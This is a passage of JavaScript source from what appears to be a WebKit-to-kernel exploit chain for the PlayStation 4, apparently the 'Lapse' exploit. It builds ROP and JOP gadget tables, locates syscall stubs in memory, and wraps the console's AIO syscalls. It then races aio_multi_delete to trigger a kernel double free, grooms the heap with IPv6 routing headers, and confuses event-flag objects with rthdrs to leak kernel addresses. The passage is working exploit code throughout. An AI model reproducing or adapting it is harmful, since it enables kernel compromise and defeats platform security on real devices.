    throw Error(`max_search_size is less than 0: ${max_search_size}`);
  }
  const libkernel_web_buffer = make_buffer(
    libkernel_web_base,
    max_search_size
  );
  const kbuf = new BufferView(libkernel_web_buffer);
  // Search 'rdlo' string from libkernel_web's .rodata section to gain an
  // upper bound on the size of the .text section.
  let text_size = 0;
  let found = false;
  for (let i = 0; i < max_search_size; i++) {
    if (kbuf[i] === 0x72
      && kbuf[i + 1] === 0x64
      && kbuf[i + 2] === 0x6c
      && kbuf[i + 3] === 0x6f
    ) {
      text_size = i;
      found = true;
      break;
    }
  }
  if (!found) {
    throw Error(
      '"rdlo" string not found in libkernel_web, base address:'
      + ` ${libkernel_web_base}`);
  }
  // search for the instruction sequence:
  // syscall_X:
  //     mov rax, X
  //     mov r10, rcx
  //     syscall
  for (let i = 0; i < text_size; i++) {
    if (kbuf[i] === 0x48
      && kbuf[i + 1] === 0xc7
      && kbuf[i + 2] === 0xc0
      && kbuf[i + 7] === 0x49
      && kbuf[i + 8] === 0x89
      && kbuf[i + 9] === 0xca
      && kbuf[i + 10] === 0x0f
      && kbuf[i + 11] === 0x05
    ) {
      const syscall_num = kbuf.read32(i + 3);
      syscall_array[syscall_num] = libkernel_web_base.add(i);
      // skip the sequence
      i += 11;
    }
  }
}

function rop_init(Chain) {
  [libwebkit_base, libkernel_base, libc_base] = get_bases();
  init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
  init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
  init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
  init_syscall_array(syscall_array, libkernel_base, 300 * KB);
  if ((config_target >= 0x700) && (config_target < 0x900)) {
    let gs = Object.getOwnPropertyDescriptor(window, "location").set;
    // JSCustomGetterSetter.m_getterSetter
    gs = mem.addrof(gs).readp(0x28);
    // sizeof JSC::CustomGetterSetter
    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs);
    // JSC::CustomGetterSetter.m_setter
    gc_buf.write64(0x10, get_gadget(gadgets, jop8));
    const proto = Chain.prototype;
    // _rop must have a descriptor initially in order for the structure to pass
    // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
    // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
    // checks for any descriptor to run
    //
    // the butterfly's indexing type must be something the GC won't inspect
    // like DoubleShape. it will be used to store the JOP table's pointer
    const _rop = {
      get launch() {
        throw Error("never call");
      },
      0: 1.1,
    };
    // replace .launch with the actual custom getter/setter
    mem.addrof(_rop).write64(off_js_inline_prop, gc_buf);
    proto._rop = _rop;
    // JOP table
    var rax_ptrs = new Uint8Array(0x100);
    var rax_ptrs_p = mt_get_view_vector(rax_ptrs);
    this._rax_ptrs = rax_ptrs; // Prevent GC
    proto._rax_ptrs = rax_ptrs;
    rw_write64(rax_ptrs, 0x70, get_gadget(gadgets, jop9));
    rw_write64(rax_ptrs, 0x30, get_gadget(gadgets, jop10));
    rw_write64(rax_ptrs, 0x40, get_gadget(gadgets, jop6));
    rw_write64(rax_ptrs, 0x00, get_gadget(gadgets, jop7));
    const jop_buffer_p = mem.addrof(_rop).readp(off_js_butterfly);
    jop_buffer_p.write64(0, rax_ptrs_p);
    const empty = {};
    proto._empty_cell = mem.addrof(empty).read64(off_js_cell);
  }
  //log('syscall_array:');
  //log(syscall_array);
  Chain.init_class(gadgets, syscall_array);
}

function ViewMixin(superclass) {
  const res = class extends superclass {
    constructor(...args) {
      super(...args);
      this.buffer;
    }
    get addr() {
      let res = this._addr_cache;
      if (res !== undefined) {
        return res;
      }
      res = mt_get_view_vector(this);
      this._addr_cache = res;
      return res;
    }
    get size() {
      return this.byteLength;
    }
    addr_at(index) {
      const size = this.BYTES_PER_ELEMENT;
      return this.addr.add(index * size);
    }
    sget(index) {
      return this[index] | 0;
    }
  };
  // workaround for known affected versions: ps4 [6.00, 10.00)
  // see from() and of() from
  // WebKit/Source/JavaScriptCore/builtins/TypedArrayConstructor.js at PS4
  // 8.0x
  // @getByIdDirectPrivate(this, "allocateTypedArray") will fail when "this"
  // isn't one of the built-in TypedArrays. this is a violation of the
  // ECMAScript spec at that time
  // TODO assumes ps4, support ps5 as well
  // FIXME define the from/of workaround functions once
  if ((config_target >= 0x600) && (config_target < 0x1000)) {
    res.from = function from(...args) {
      const base = this.__proto__;
      return new this(base.from(...args).buffer);
    };
    res.of = function of(...args) {
      const base = this.__proto__;
      return new this(base.of(...args).buffer);
    };
  }
  return res;
}
class View1 extends ViewMixin(Uint8Array) {}
class View2 extends ViewMixin(Uint16Array) {}
class View4 extends ViewMixin(Uint32Array) {}
class Buffer extends BufferView {
  get addr() {
    let res = this._addr_cache;
    if (res !== undefined) {
      return res;
    }
    res = mt_get_view_vector(this);
    this._addr_cache = res;
    return res;
  }
  get size() {
    return this.byteLength;
  }
  addr_at(index) {
    return this.addr.add(index);
  }
}
// see from() and of() comment above
Buffer.from = function from(...args) {
  const base = this.__proto__;
  return new this(base.from(...args).buffer);
};
Buffer.of = function of(...args) {
  const base = this.__proto__;
  return new this(base.of(...args).buffer);
};
const VariableMixin = superclass => class extends superclass {
  constructor(value=0) {
    // unlike the View classes, we don't allow number coercion. we
    // explicitly allow floats unlike Int
    if (typeof value !== 'number') {
      throw TypeError('value not a number');
    }
    super([value]);
  }
  addr_at(...args) {
    throw TypeError('unimplemented method');
  }
  [Symbol.toPrimitive](hint) {
    return this[0];
  }
  toString(...args) {
    return this[0].toString(...args);
  }
};
class Byte extends VariableMixin(View1) {}
class Short extends VariableMixin(View2) {}
class Word extends VariableMixin(View4) {}
class LongArray {
  constructor(length) {
    this.buffer = new DataView(new ArrayBuffer(length * 8));
  }
  get addr() {
    return mt_get_view_vector(this.buffer);
  }
  addr_at(index) {
    return this.addr.add(index * 8);
  }
  get length() {
    return this.buffer.length / 8;
  }
  get size() {
    return this.buffer.byteLength;
  }
  get byteLength() {
    return this.size;
  }
  get(index) {
    const buffer = this.buffer;
    const base = index * 8;
    return new Int(
      buffer.getUint32(base, true),
      buffer.getUint32(base + 4, true)
    );
  }
  set(index, value) {
    const buffer = this.buffer;
    const base = index * 8;
    const values = lohi_from_one(value);
    buffer.setUint32(base, values[0], true);
    buffer.setUint32(base + 4, values[1], true);
  }
}
// mutable Int (we are explicitly using Int's private fields)
const Word64Mixin = superclass => class extends superclass {
  constructor(...args) {
    if (!args.length) {
      return super(0);
    }
    super(...args);
  }
  get addr() {
    // assume this is safe to cache
    return mt_get_view_vector(this._u32);
  }
  get length() {
    return 1;
  }
  get size() {
    return 8;
  }
  get byteLength() {
    return 8;
  }
  // no setters for top and bot since low/high can accept negative integers
  get lo() {
    return super.lo;
  }
  set lo(value) {
    this._u32[0] = value;
  }
  get hi() {
    return super.hi;
  }
  set hi(value) {
    this._u32[1] = value;
  }
  set(value) {
    const buffer = this._u32;
    const values = lohi_from_one(value);
    buffer[0] = values[0];
    buffer[1] = values[1];
  }
};
class Long extends Word64Mixin(Int) {
  as_addr() {
    return new Addr(this);
  }
}
class Pointer extends Word64Mixin(Addr) {}
// create a char array like in the C language
// string to view since it's easier to get the address of the buffer this way
function cstr(str) {
  str += '\0';
  return View1.from(str, c => c.codePointAt(0));
}
// make a JavaScript string
function jstr(buffer) {
  let res = '';
  for (const item of buffer) {
    if (item === 0) {
      break;
    }
    res += String.fromCodePoint(item);
  }
  // convert to primitive string
  return String(res);
}
// sys/socket.h
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;
// netinet/in.h
const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
// netinet/tcp.h
const TCP_INFO = 0x20;
const size_tcp_info = 0xec;
// netinet/tcp_fsm.h
const TCPS_ESTABLISHED = 4;
// netinet6/in6.h
const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;
// sys/cpuset.h
const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;
const sizeof_cpuset_t_ = 16;
// sys/mman.h
const MAP_SHARED = 1;
const MAP_FIXED = 0x10;
const MAP_ANON = 0x1000;
const MAP_PREFAULT_READ = 0x00040000;
// sys/rtprio.h
const RTP_LOOKUP = 0;
const RTP_SET = 1;
const RTP_PRIO_ITHD = 1;
const RTP_PRIO_REALTIME = 2;
const RTP_PRIO_NORMAL = 3;
const RTP_PRIO_IDLE = 4;
//
const PROT_READ = 0x01;
const PROT_WRITE = 0x02;
const PROT_EXEC = 0x04;
// SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
// has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
// group. queue 0 of each group is currently unused. queue 1 has the lowest
// priority and queue 3 has the highest
//
// the SceFsstAIO workers will process entries at the main queues. they will
// refill the main queues from the corresponding wait queues each time they
// dequeue a request (e.g. fill the  low priority main queue from the low
// priority wait queue)
//
// entries on the wait queue will always have a 0 ticket number. they will
// get assigned a nonzero ticket number once they get put on the main queue
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
// max number of requests that can be created/polled/canceled/deleted/waited
const max_aio_ids = 0x80;
// highest priority we can achieve given our credentials
// Initialize rtprio lazily to avoid TDZ issues
let rtprio = null;
function get_rtprio() {
  if (rtprio === null) {
    rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);
  }
  return rtprio;
}
// CONFIG CONSTANTS
const main_core = 7;
const num_grooms = 0x200;
const num_handles = 0x100;
const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
const num_alias = 100;
const num_races = 100;
const leak_len = 16;
const num_leaks_kernel = 5;
const num_clobbers = 8;
let chain = null;
let nogc = [];
//================================================================================================
// LAPSE INIT FUNCTION ===========================================================================
//================================================================================================
async function lapse_init() {
  rop_init(Chain);
  chain = new Chain();
  init_gadget_map(gadgets, pthread_offsets, libkernel_base);
}

function sys_void(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  return chain.syscall_void(...args);
}

function sysi(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  return chain.sysi(...args);
}

function call_nze(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  const res = chain.call_int(...args);
  if (res !== 0) {
    die(`call(${args[0]}) returned nonzero: ${res}`);
  }
}
// #define SCE_KERNEL_AIO_STATE_NOTIFIED       0x10000
//
// #define SCE_KERNEL_AIO_STATE_SUBMITTED      1
// #define SCE_KERNEL_AIO_STATE_PROCESSING     2
// #define SCE_KERNEL_AIO_STATE_COMPLETED      3
// #define SCE_KERNEL_AIO_STATE_ABORTED        4
//
// typedef struct SceKernelAioResult {
//     // errno / SCE error code / number of bytes processed
//     int64_t returnValue;
//     // SCE_KERNEL_AIO_STATE_*
//     uint32_t state;
// } SceKernelAioResult;
//
// typedef struct SceKernelAioRWRequest {
//     off_t offset;
//     size_t nbyte;
//     void *buf;
//     struct SceKernelAioResult *result;
//     int fd;
// } SceKernelAioRWRequest;
//
// typedef int SceKernelAioSubmitId;
//
// // SceAIO submit commands
// #define SCE_KERNEL_AIO_CMD_READ     0x001
// #define SCE_KERNEL_AIO_CMD_WRITE    0x002
// #define SCE_KERNEL_AIO_CMD_MASK     0xfff
// // SceAIO submit command flags
// #define SCE_KERNEL_AIO_CMD_MULTI 0x1000
//
// #define SCE_KERNEL_AIO_PRIORITY_LOW     1
// #define SCE_KERNEL_AIO_PRIORITY_MID     2
// #define SCE_KERNEL_AIO_PRIORITY_HIGH    3
// int aio_submit_cmd(
//     u_int cmd,
//     SceKernelAioRWRequest reqs[],
//     u_int num_reqs,
//     u_int prio,
//     SceKernelAioSubmitId ids[]
// );
function aio_submit_cmd(cmd, requests, num_requests, handles) {
  sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
}
// the various SceAIO syscalls that copies out errors/states will not check if
// the address is NULL and will return EFAULT. this dummy buffer will serve as
// the default argument so users don't need to specify one
let _aio_errors = new View4(max_aio_ids);
// Initialize _aio_errors_p lazily to avoid TDZ issues with mem
let _aio_errors_p = null;
function get_aio_errors_p() {
  if (_aio_errors_p === null) {
    _aio_errors_p = _aio_errors.addr;
  }
  return _aio_errors_p;
}
// int aio_multi_delete(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[]
// );
function aio_multi_delete(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_delete', ids, num_ids, sce_errs);
}
// int aio_multi_poll(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_poll(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_poll', ids, num_ids, sce_errs);
}
// int aio_multi_cancel(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_cancel(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_cancel', ids, num_ids, sce_errs);
}
// // wait for all (AND) or atleast one (OR) to finish
// // DEFAULT is the same as AND
// #define SCE_KERNEL_AIO_WAIT_DEFAULT 0x00
// #define SCE_KERNEL_AIO_WAIT_AND     0x01
// #define SCE_KERNEL_AIO_WAIT_OR      0x02
//
// int aio_multi_wait(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[],
//     //SCE_KERNEL_AIO_WAIT_*
//     uint32_t mode,
//     useconds_t *timeout
// );
function aio_multi_wait(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_wait', ids, num_ids, sce_errs, 1, 0);
}

function make_reqs1(num_reqs) {
  const reqs1 = new Buffer(0x28 * num_reqs);
  for (let i = 0; i < num_reqs; i++) {
    // .fd = -1
    reqs1.write32(0x20 + i * 0x28, -1);
  }
  return reqs1;
}

function spray_aio(loops=1, reqs1_p, num_reqs, ids_p, multi=true, cmd=AIO_CMD_READ) {
  const step = 4 * (multi ? num_reqs : 1);
  cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
  for (let i = 0, idx = 0; i < loops; i++) {
    aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx));
    idx += step;
  }
}

function poll_aio(ids, states, num_ids=ids.length) {
  if (states !== undefined) {
    states = states.addr;
  }
  aio_multi_poll(ids.addr, num_ids, states);
}

function cancel_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (let bi = 0; bi < num_batches; bi++) {
    aio_multi_cancel(ids_p.add((bi << 2) * len), len);
  }
  if (rem) {
    aio_multi_cancel(ids_p.add((num_batches << 2) * len), rem);
  }
}

function free_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (let bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function free_aios2(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (let bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function get_cpu_affinity(mask) {
  sysi(
    'cpuset_getaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    sizeof_cpuset_t_,
    mask.addr
  );
}

function set_cpu_affinity(mask) {
  sysi(
    'cpuset_setaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    sizeof_cpuset_t_,
    mask.addr
  );
}

function pin_to_core(core) {
  const mask = new Buffer(sizeof_cpuset_t_);
  mask.write32(0, 1 << core);
  set_cpu_affinity(mask);
}

function get_core_index(mask) {
  let num = mem.read32(mask.addr);
  let position = 0;
  while (num > 0) {
    num = num >>> 1;
    position += 1;
  }
  return position - 1;
}

function get_current_core() {
  const mask = new Buffer(sizeof_cpuset_t_);
  get_cpu_affinity(mask);
  return get_core_index(mask);
}

function get_current_rtprio() {
  const _rtprio = new Buffer(4);
  sysi('rtprio_thread', RTP_LOOKUP, 0, _rtprio.addr);
  return {
    type: _rtprio.read16(0),
    prio: _rtprio.read16(2),
  };
}

function set_rtprio(rtprio_obj) {
  const _rtprio = new Buffer(4);
  _rtprio.write16(0, rtprio_obj.type);
  _rtprio.write16(2, rtprio_obj.prio);
  sysi('rtprio_thread', RTP_SET, 0, _rtprio.addr);
}

function close(fd) {
  sysi('close', fd);
}

function new_socket() {
  return sysi('socket', AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

function new_tcp_socket() {
  return sysi('socket', AF_INET, SOCK_STREAM, 0);
}

function gsockopt(sd, level, optname, optval, optlen) {
  const size = new Word(optval.size);
  if (optlen !== undefined) {
    size[0] = optlen;
  }
  sysi('getsockopt', sd, level, optname, optval.addr, size.addr);
  return size[0];
}

function setsockopt(sd, level, optname, optval, optlen) {
  sysi('setsockopt', sd, level, optname, optval, optlen);
}

function ssockopt(sd, level, optname, optval, optlen) {
  if (optlen === undefined) {
    optlen = optval.size;
  }

  const addr = optval.addr;
  setsockopt(sd, level, optname, addr, optlen);
}

function get_rthdr(sd, buf, len) {
  return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
  ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function free_rthdrs(sds) {
  for (const sd of sds) {
    setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
  }
}

function build_rthdr(buf, size) {
  const len = ((size >> 3) - 1) & ~1;
  size = (len + 1) << 3;
  buf[0] = 0;
  buf[1] = len;
  buf[2] = 0;
  buf[3] = len >> 1;
  return size;
}

function spawn_thread(thread) {
  const ctx = new Buffer(off_context_size);
  const pthread = new Pointer();
  pthread.ctx = ctx;
  // pivot the pthread's stack pointer to our stack
  ctx.write64(0x38, thread.stack_addr);
  ctx.write64(0x80, thread.get_gadget('ret'));
  call_nze(
    'pthread_create',
    pthread.addr,
    0,
    chain.get_gadget('setcontext'),
    ctx.addr
  );
  return pthread;
}
//================================================================================================
// FUNCTIONS FOR STAGE: 0x80 MALLOC ZONE DOUBLE FREE =============================================
//================================================================================================
function make_aliased_rthdrs(sds) {
  const marker_offset = 4;
  const size = 0x80;
  const buf = new Buffer(size);
  const rsize = build_rthdr(buf, size);
  for (let loop = 0; loop < num_alias; loop++) {
    for (let i = 0; i < num_sds; i++) {
      buf.write32(marker_offset, i);
      set_rthdr(sds[i], buf, rsize);
    }
    for (let i = 0; i < sds.length; i++) {
      get_rthdr(sds[i], buf);
      const marker = buf.read32(marker_offset);
      if (marker !== i) {
        //log(`aliased rthdrs at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        //log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        free_rthdrs(sds);
        sds.push(new_socket(), new_socket());
        return pair;
      }
    }
  }
  die(`failed to make aliased rthdrs. size: ${hex(size)}`);
}
// summary of the bug at aio_multi_delete():
//void free_queue_entry(struct aio_entry *reqs2) {
//  if (reqs2->ar2_spinfo != NULL) {
//    printf(
//      "[0]%s() line=%d Warning !! split info is here\n",
//      __func__,
//      __LINE__
//    );
//  }
//  if (reqs2->ar2_file != NULL) {
//    // we can potentially delay .fo_close()
//    fdrop(reqs2->ar2_file, curthread);
//    reqs2->ar2_file = NULL;
//  }
//  free(reqs2, M_AIO_REQS2);
//}
//int _aio_multi_delete(
//  struct thread *td,
//  SceKernelAioSubmitId ids[],
//  u_int num_ids,
//  int sce_errors[]) {
//  // ...
//  struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
//  // ...
//  u_int rem_ids = obj->ao_rem_ids;
//  if (rem_ids != 1) {
//    // BUG: wlock not acquired on this path
//    obj->ao_rem_ids = --rem_ids;
//    // ...
//    free_queue_entry(obj->ao_entries[req_idx]);
//    // the race can crash because of a NULL dereference since this path
//    // doesn't check if the array slot is NULL so we delay
//    // free_queue_entry()
//    obj->ao_entries[req_idx] = NULL;
//  } else {
//    // ...
//  }
//  // ...
//}
function race_one(request_addr, tcp_sd, barrier, racer, sds) {
  const sce_errs = new View4([-1, -1]);
  const thr_mask = new Word(1 << main_core);
  const thr = racer;
  thr.push_syscall(
    'cpuset_setaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    8,
    thr_mask.addr
  );
  thr.push_syscall('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
  thr.push_gadget('pop rax; ret');
  thr.push_value(1);
  thr.push_get_retval();
  thr.push_call('pthread_barrier_wait', barrier.addr);
  thr.push_syscall(
    'aio_multi_delete',
    request_addr,
    1,
    sce_errs.addr_at(1)
  );
  thr.push_call('pthread_exit', 0);
  const pthr = spawn_thread(thr);
  const thr_tid = pthr.read32(0);
  // pthread barrier implementation:
  // given a barrier that needs N threads for it to be unlocked, a thread
  // will sleep if it waits on the barrier and N - 1 threads havent't arrived
  // before
  // if there were already N - 1 threads then that thread (last waiter) won't
  // sleep and it will send out a wake-up call to the waiting threads
  // since the ps4's cores only have 1 hardware thread each, we can pin 2
  // threads on the same core and control the interleaving of their
  // executions via controlled context switches
  // wait for the worker to enter the barrier and sleep
  while (thr.retval_int === 0) {
    sys_void('sched_yield');
  }
  // enter the barrier as the last waiter
  chain.push_call('pthread_barrier_wait', barrier.addr);
  // yield and hope the scheduler runs the worker next. the worker will then
  // sleep at soclose() and hopefully we run next
  chain.push_syscall('sched_yield');
  // if we get here and the worker hasn't been reran then we can delay the
  // worker's execution of soclose() indefinitely
  chain.push_syscall('thr_suspend_ucontext', thr_tid);
  chain.push_get_retval();
  chain.push_get_errno();
  chain.push_end();
  chain.run();
  chain.reset();
  const main_res = chain.retval_int;
  //log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);
  if (main_res === -1) {
    call_nze('pthread_join', pthr, 0);
    //log();
    return null;
  }
  let won_race = false;
  try {
    const poll_err = new View4(1);
    aio_multi_poll(request_addr, 1, poll_err.addr);
    //log(`poll: ${hex(poll_err[0])}`);
    const info_buf = new View1(size_tcp_info);
    const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
    //log(`info size: ${hex(info_size)}`);
    if (info_size !== size_tcp_info) {
      die(`info size isn't ${size_tcp_info}: ${info_size}`);
    }
    const tcp_state = info_buf[0];
    //log(`tcp_state: ${tcp_state}`);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH
      && tcp_state !== TCPS_ESTABLISHED
    ) {
      // PANIC: double free on the 0x80 malloc zone. important kernel
      // data may alias
      aio_multi_delete(request_addr, 1, sce_errs.addr);
      won_race = true;
    }
  } finally {
    //log('resume thread\n');
    sysi('thr_resume_ucontext', thr_tid);
    call_nze('pthread_join', pthr, 0);
  }
  if (won_race) {
    //log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    // if the code has no bugs then this isn't possible but we keep the
    // check for easier debugging
    if (sce_errs[0] !== sce_errs[1]) {
      //log('ERROR: bad won_race');
      die('ERROR: bad won_race');
    }
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x80 malloc zone pointers aliased
    return make_aliased_rthdrs(sds);
  }
  return null;
}
//================================================================================================
// STAGE DOUBLE FREE AIO QUEUE ENTRY =============================================================
//================================================================================================
function double_free_reqs2(sds) {
  function swap_bytes(x, byte_length) {
    let res = 0;
    for (let i = 0; i < byte_length; i++) {
      res |= ((x >> (8 * i)) & 0xff) << (8 * (byte_length - i - 1));
    }
    return res >>> 0;
  }
  function htons(x) {
    return swap_bytes(x, 2);
  }
  function htonl(x) {
    return swap_bytes(x, 4);
  }
  const server_addr = new Buffer(16);
  // sockaddr_in.sin_family
  server_addr[1] = AF_INET;
  // sockaddr_in.sin_port
  server_addr.write16(2, htons(5050));
  // sockaddr_in.sin_addr = 127.0.0.1
  server_addr.write32(4, htonl(0x7f000001));
  const racer = new Chain();
  const barrier = new Long();
  call_nze('pthread_barrier_init', barrier.addr, 0, 2);
  const num_reqs = 3;
  const which_req = num_reqs - 1;
  const reqs1 = make_reqs1(num_reqs);
  const reqs1_p = reqs1.addr;
  const aio_ids = new View4(num_reqs);
  const aio_ids_p = aio_ids.addr;
  const req_addr = aio_ids.addr_at(which_req);
  const cmd = AIO_CMD_MULTI_READ;
  const sd_listen = new_tcp_socket();
  ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1));
  sysi('bind', sd_listen, server_addr.addr, server_addr.size);
  sysi('listen', sd_listen, 1);
  for (let i = 0; i < num_races; i++) {
    const sd_client = new_tcp_socket();
    sysi('connect', sd_client, server_addr.addr, server_addr.size);
    const sd_conn = sysi('accept', sd_listen, 0, 0);
    // force soclose() to sleep
    ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
    reqs1.write32(0x20 + which_req * 0x28, sd_client);
    aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
    aio_multi_cancel(aio_ids_p, num_reqs);
    aio_multi_poll(aio_ids_p, num_reqs);
    // drop the reference so that aio_multi_delete() will trigger _fdrop()
    close(sd_client);
    const res = race_one(req_addr, sd_conn, barrier, racer, sds);
    racer.reset();
    // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
    // twice. this will leave one request undeleted
    aio_multi_delete(aio_ids_p, num_reqs);
    close(sd_conn);
    if (res !== null) {
      window.log(` - Won race at attempt: ${i}`);
      close(sd_listen);
      call_nze('pthread_barrier_destroy', barrier.addr);
      return res;
    }
  }
  die('failed aio double free');
}
//================================================================================================
// FUNCTIONS FOR STAGE: LEAK 0x100 MALLOC ZONE ADDRESS ===========================================
//================================================================================================
function new_evf(flags) {
  const name = cstr('');
  // int evf_create(char *name, uint32_t attributes, uint64_t flags)
  return sysi('evf_create', name.addr, 0, flags);
}

function set_evf_flags(id, flags) {
  sysi('evf_clear', id, 0);
  sysi('evf_set', id, flags);
}

function free_evf(id) {
  sysi('evf_delete', id);
}

function verify_reqs2(buf, offset) {
  // reqs2.ar2_cmd
  if (buf.read32(offset) !== AIO_CMD_WRITE) {
    return false;
  }
  // heap addresses are prefixed with 0xffff_xxxx
  // xxxx is randomized on boot
  // heap_prefixes is a array of randomized prefix bits from a group of heap
  // address candidates. if the candidates truly are from the heap, they must
  // share a common prefix
  const heap_prefixes = [];
  // check if offsets 0x10 to 0x20 look like a kernel heap address
  for (let i = 0x10; i <= 0x20; i += 8) {
    if (buf.read16(offset + i + 6) !== 0xffff) {
      return false;
    }
    heap_prefixes.push(buf.read16(offset + i + 4));
  }
  // check reqs2.ar2_result.state
  // state is actually a 32-bit value but the allocated memory was
  // initialized with zeros. all padding bytes must be 0 then
  var state = buf.read32(offset + 0x38);
  if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0) {
    return false;
  }
  // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
  // aio_submit_cmd()
  if (!buf.read64(offset + 0x40).eq(0)) {
    return false;
  }
  // check if offsets 0x48 to 0x50 look like a kernel address
  for (let i = 0x48; i <= 0x50; i += 8) {
    if (buf.read16(offset + i + 6) === 0xffff) {
      // don't push kernel ELF addresses
      if (buf.read16(offset + i + 4) !== 0xffff) {
        heap_prefixes.push(buf.read16(offset + i + 4));
      }
      // offset 0x48 can be NULL
    } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) {
      return false;
    }
  }
  return heap_prefixes.every((e, i, a) => e === a[0]);
}
//================================================================================================
// STAGE LEAK KERNEL ADDRESSES ===================================================================
//================================================================================================
function leak_kernel_addrs(sd_pair) {
  close(sd_pair[1]);
  const sd = sd_pair[0];
  const buf = new Buffer(0x80 * leak_len);
  // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
  // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
  //log('confuse evf with rthdr');
  let evf = null;
  for (let i = 0; i < num_alias; i++) {
    const evfs = [];
    for (let i = 0; i < num_handles; i++) {
      evfs.push(new_evf(0xf00 | (i << 16)));
    }
    get_rthdr(sd, buf, 0x80);
    // for simplicity, we'll assume i < 2**16
    const flags32 = buf.read32(0);
    evf = evfs[flags32 >>> 16];
    set_evf_flags(evf, flags32 | 1);
    get_rthdr(sd, buf, 0x80);
    // double check with Al-Azif
    if (buf.read32(0) === (flags32 | 1)) {
      evfs.splice(flags32 >> 16, 1);
    } else {
      evf = null;
    }
    for (const evf of evfs) {
      free_evf(evf);
    }
    if (evf !== null) {
      //log(`confused rthdr and evf at attempt: ${i}`);
      break;
    }
  }
  if (evf === null) {
